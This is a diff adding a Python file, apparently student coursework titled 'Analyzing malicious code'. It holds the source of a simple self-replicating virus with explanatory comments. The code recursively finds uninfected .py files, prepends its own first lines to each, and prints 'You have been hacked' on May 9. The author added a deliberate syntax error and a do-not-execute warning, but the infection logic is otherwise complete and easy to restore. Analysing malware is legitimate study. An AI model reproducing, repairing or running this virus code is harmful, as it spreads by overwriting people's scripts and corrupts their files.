@@ -1,0 +1,102 @@
+# WARNING: DO NOT EXECUTE THIS SCRIPT. IT IS INTENDED FOR ANALYZING MALICIOUS CODE
+
+#!/usr/bin/python3
+
+#!/usr/bin/env python3
+
+# Script Name:                  Lists in Python
+# Author:                       Chris Bennett
+# Date of latest revision:      06/16/23
+# Purpose:                      Analyzing malicious code
+
+# Imports the OS module for Python that enables interaction with the operating system.
+import os
+
+# Imports a module that enables manipulation of dates and times
+import datetime
+
+# Sets "signature" as a variable that equals "virus"
+SIGNATURE = "VIRUS"
+
+# Defines a function of locating a path
+def locate(path):
+
+# Sets located path as the variable "files_targeted"
+    files_targeted = []
+
+# Lists the folders in the operating system and designates the results as the path represented by the variable "filelist"
+    filelist = os.listdir(path)
+
+# Creates a "for loop" function that the following commands be applied to all folders the above search returns
+    for fname in filelist:
+
+# Creates a conditional loop that determines if the list returned refers to a directory. If it does, it adds that file path to the list of targets 
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+
+# If the above does not refer to a directory, it checks the file extension to see if it is a Python code script and, if it is, check if it is already infected
+        elif fname[-3:] == ".py":
+            infected = False
+
+# Checks to see if the word "virus" is in the file to show it is already infected. If it is, it breaks the loop. If not, the loop continues to the next steps. 
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+
+# If the check finds the file is not yet infected, it adds it to the target list. Essentially, this block of code sets uninfected directories and Pythin code scipts as targets to be infected
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+
+# Defines a function of infecting the targeted files
+def infect(files_targeted):
+
+# Creates a function to open the file containing the malicious code and gets it ready to execute with the variable "virusstring"
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+
+# Pulls out the code in the virus file and appends the first 38 lines of it to the "virusstring" variable
+    for i,line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+
+# Closes the virus file, keeping only the 38 lines that are now assigned to the variable
+    virus.close
+
+for # (Inserted as a syntax error for a safety stop)
+
+# For each of the files in the targeted list:
+    for fname in files_targeted:
+# Open it
+        f = open(fname)
+# Extract the contents and assign them to the variable "temp"
+        temp = f.read()
+# Close the file
+        f.close()
+# Open the file again in writable mode
+        f = open(fname,"w")
+# Add the malicious code, followed by the original contents of the file
+        f.write(virusstring + temp)
+# Close the file
+        f.close()
+
+# Defines "detonate" as a function to:
+def detonate():
+# Use a conditional to check if the month is May
+    if datetime.datetime.now().month == 5 and datetime.
+# ...and the day is the ninth...
+    datetime.now().day == 9:
+# then print to the screen "You have been hacked"
+        print("You have been hacked")
+
+# Locates all the files on the targeted list via direct path
+files_targeted = locate(os.path.abspath(""))
+# Invokes the "infect" function to infect the targeted files
+infect(files_targeted)
+# Executes the function of beginning the loop of checking if it is the correct date to begin the infection
+detonate()
+
+# Credit: ChatGPT and explainshell.com were utilized as tools in examining some lines of code
+
+# End
